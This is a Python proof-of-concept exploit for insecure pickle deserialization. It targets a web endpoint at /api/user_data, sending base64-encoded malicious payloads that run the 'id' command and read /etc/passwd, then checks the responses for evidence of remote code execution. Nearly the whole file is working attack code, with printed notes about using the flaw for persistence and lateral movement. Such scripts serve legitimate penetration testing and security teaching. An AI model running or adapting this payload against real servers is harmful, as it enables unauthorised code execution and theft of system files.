#!/usr/bin/env python3

import requests
import sys
import pickle
import base64
import os
import subprocess

class RCEPayload:
    def __reduce__(self):
        # This will execute the 'id' command when deserialized
        # In a real attack, this could be much more dangerous
        return exec, ("import os; os.system('id')",)

class FileReaderPayload:
    def __reduce__(self):
        # This will read /etc/passwd when deserialized
        filename = '/etc/passwd'
        return open, (filename, 'r',)

def insecure_deserialization_poc(base_url):
    print("\n[*] Insecure Deserialization Proof of Concept")
    print("[*] This PoC demonstrates remote code execution via insecure deserialization")
    
    # Generate and print the malicious payload
    print("\n[+] Generating malicious payload...")
    payload = RCEPayload()
    serializedData = base64.b64encode(pickle.dumps(payload)).decode('utf-8')
    print(f"[+] Base64 encoded payload: {serializedData}")
    
    # The vulnerable endpoint
    api_url = f"{base_url}/api/user_data"
    
    # First, try with a normal payload to confirm the functionality works
    print("\n[+] Testing with a normal payload...")
    normal_data = {"username": "test_user", "role": "user"}
    serialized = base64.b64encode(pickle.dumps(normal_data)).decode('utf-8')
    
    response = requests.get(api_url, params={"data": serialized})
    if response.status_code == 200 and "test_user" in response.text:
        print("[+] Normal deserialization works as expected")
        print(f"[+] Response: {response.text}")
    else:
        print("[-] Normal deserialization failed")
        print(f"[-] Status code: {response.status_code}")
        print(f"[-] Response: {response.text}")
        print("[-] Endpoint might not be vulnerable or might not be accessible")
        return
    
    # Now try with the malicious payload that executes code
    print("\n[+] Attempting code execution via insecure deserialization...")
    print("[+] Sending malicious pickle payload that executes 'id' command...")
    response = requests.get(api_url, params={"data": serializedData})
    
    # Check if the command was executed
    if response.status_code == 200:
        print("[+] Payload sent successfully")
        print(f"[+] Response: {response.text}")
        
        # Look for signs of successful command execution
        if "uid=" in response.text or "gid=" in response.text:
            print("[!] INSECURE DESERIALIZATION VULNERABILITY CONFIRMED!")
            print("[!] Remote code execution successful!")
            print("[+] Command output found in the response")
            
            print("\n[+] This vulnerability could be used to:")
            print("    1. Execute arbitrary commands on the server")
            print("    2. Access sensitive files")
            print("    3. Establish persistence")
            print("    4. Pivot to other systems in the network")
            
            # Try another payload that reads a file
            print("\n[+] Attempting to read a file via insecure deserialization...")
            file_payload = FileReaderPayload()
            file_serialized = base64.b64encode(pickle.dumps(file_payload)).decode('utf-8')
            print(f"[+] Base64 encoded file reading payload: {file_serialized}")
            
            response = requests.get(api_url, params={"data": file_serialized})
            if response.status_code == 200 and "root:" in response.text:
                print("[!] Successfully read /etc/passwd file!")
                print("[+] File content preview:")
                content = response.json()
                if hasattr(content, 'read'):
                    file_content = content.read()
                    print(file_content[:200] + "..." if len(file_content) > 200 else file_content)
        else:
            print("[-] Command execution attempt failed, but the application might still be vulnerable")
            print("[-] The application might be catching exceptions from the deserialization process")
    else:
        print("[-] Failed to send malicious payload")
        print(f"[-] Status code: {response.status_code}")
        print(f"[-] Response: {response.text}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
        
    base_url = sys.argv[1].rstrip('/')
    insecure_deserialization_poc(base_url)